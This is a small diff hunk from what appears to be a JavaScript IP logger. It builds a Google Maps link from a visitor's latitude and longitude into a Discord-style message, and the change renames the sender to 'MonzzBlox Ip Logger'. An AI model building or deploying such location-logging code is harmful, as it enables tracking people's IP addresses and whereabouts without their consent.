@@ -26,7 +26,7 @@ fetch('./config.json')
       const googleMapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
 
       const message = {
-        username: 'By MonzzBlox😎',
+        username: 'MonzzBlox Ip Logger 😎',
         avatar_url: 'https://media.discordapp.net/attachments/1152689404855472261/1199478077105909800/20240123_033016.jpg?ex=65cbea82&is=65b97582&hm=d8c3e7ec8ce402bbaab5c3494c59781987f26f381be2f6a4dbb414d025bae7c1&=&format=webp&width=600&height=600',
         embeds: [
           {
